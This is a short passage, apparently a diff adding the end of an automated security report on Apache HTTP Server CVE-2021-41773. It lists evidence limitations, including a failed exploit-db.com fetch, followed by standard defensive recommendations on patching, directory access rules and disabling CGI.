+- Evidence limitation: The Analyzer and Verifier findings were retained without rewriting.
+- Evidence limitation: Webpage read unavailable for www.exploit-db.com: URLError: <urlopen error [WinError 10054] An existing connection was forcibly closed by the remote host>
+- Evidence limitation: 2 online CVE record(s) were retained as product-related research leads only; they were not used as the validated CVE.
+
+Defensive Recommendation:
+- Apply updates per vendor instructions to mitigate CVE-2021-41773.
+- Ensure Apache HTTP Server configurations are set to 'require all denied' for directories not explicitly allowed.
+- Disable CGI scripts if not necessary to reduce attack surface.
